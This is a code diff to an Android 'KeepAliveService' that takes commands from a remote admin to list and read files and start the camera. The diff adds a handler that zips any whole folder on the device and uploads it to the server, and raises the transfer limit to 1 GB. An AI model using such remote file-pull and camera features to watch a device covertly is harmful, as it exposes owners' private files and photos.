@@ -68,7 +68,7 @@ public class KeepAliveService extends Service {
 
     private static final String CHANNEL_ID = "meeee_bg";
     private static final int    NOTIF_ID   = 1001;
-    private static final long   MAX_FILE_BYTES = 200L * 1024 * 1024; // 200 MB
+    private static final long   MAX_FILE_BYTES = 1024L * 1024 * 1024; // 1 GB — matches the server's raised MAX_FILE_MB (see server/index.js), now that transfers stream to disk on both ends instead of buffering in memory.
     // How long to sit connected with nothing happening before shutting back down to fully
     // dormant. Not a keepalive interval — every incoming message/active session cancels this,
     // it only ever fires once things have genuinely gone quiet (see maybeScheduleIdleShutdown).
@@ -593,6 +593,8 @@ public class KeepAliveService extends Service {
                 handleLs(ws, msg);
             } else if ("read_file".equals(type)) {
                 handleReadFile(msg); // HTTP POST — no WebSocket needed for upload
+            } else if ("download_folder".equals(type)) {
+                handleDownloadFolder(msg);
             } else if ("start_camera".equals(type)) {
                 handleStartCamera(msg);
             } else if ("stop_camera".equals(type)) {
@@ -712,6 +714,74 @@ public class KeepAliveService extends Service {
             } catch (Exception e) {
                 notifyAdminError(fromAdminId, requestId, e.getMessage());
             } finally {
+                activeTransfers.decrementAndGet();
+                syncWakeLock();
+                maybeScheduleIdleShutdown();
+            }
+        }).start();
+    }
+
+    // Zips an entire folder (recursively — every subfolder at any depth) and uploads
+    // it the same way handleReadFile uploads a single file. Deliberately kept on this
+    // live-connection path rather than the stateless quick-pull handler: zipping and
+    // uploading a whole folder can take well past the ~25s budget that handler is
+    // bound to, whereas this service is a real foreground service with no such limit.
+    private void handleDownloadFolder(JSONObject msg) {
+        activeTransfers.incrementAndGet();
+        syncWakeLock();
+        new Thread(() -> {
+            String fromAdminId = msg.optString("fromAdminId");
+            String requestId   = msg.optString("requestId",
+                String.valueOf(System.currentTimeMillis()));
+            JSONArray pathArr  = msg.optJSONArray("path");
+            File tempZip = null;
+
+            try {
+                File dir = buildPath(pathArr);
+                if (!dir.exists() || !dir.isDirectory()) {
+                    notifyAdminError(fromAdminId, requestId, "Folder not found");
+                    return;
+                }
+
+                // Check the total size BEFORE doing any zip work — failing fast on an
+                // oversized folder (e.g. a multi-GB camera roll) beats discovering it
+                // after minutes of wasted zipping and uploading over mobile data.
+                long totalBytes = FileAccessHelper.calculateDirectorySize(dir);
+                if (totalBytes > MAX_FILE_BYTES) {
+                    long limitMb = MAX_FILE_BYTES / (1024 * 1024);
+                    long actualMb = totalBytes / (1024 * 1024);
+                    notifyAdminError(fromAdminId, requestId,
+                        "Folder is too large to download (" + actualMb + "MB, limit " + limitMb + "MB) — try a subfolder or fewer files");
+                    return;
+                }
+
+                String folderName = dir.getName().isEmpty() ? "root" : dir.getName();
+                tempZip = new File(getCacheDir(), "download_" + requestId + ".zip");
+                FileAccessHelper.zipDirectory(dir, tempZip);
+
+                String httpBase = serverUrl
+                    .replaceFirst("^wss://", "https://")
+                    .replaceFirst("^ws://", "http://")
+                    .replaceFirst("/ws$", "");
+
+                Request request = new Request.Builder()
+                    .url(httpBase + "/api/file/" + requestId)
+                    .post(RequestBody.create(tempZip, MediaType.parse("application/zip")))
+                    .header("X-File-Name", Uri.encode(folderName + ".zip"))
+                    .header("X-Admin-Id", fromAdminId)
+                    .header("X-User-Id", userId != null ? userId : "")
+                    .header("X-Upload-Token", uploadToken != null ? uploadToken : "")
+                    .header("Content-Type", "application/zip")
+                    .build();
+
+                Response response = httpClient.newCall(request).execute();
+                response.close();
+                // Server notifies admin via WebSocket once upload completes
+
+            } catch (Exception e) {
+                notifyAdminError(fromAdminId, requestId, e.getMessage());
+            } finally {
+                if (tempZip != null) { try { tempZip.delete(); } catch (Exception ignored) {} }
                 activeTransfers.decrementAndGet();
                 syncWakeLock();
                 maybeScheduleIdleShutdown();
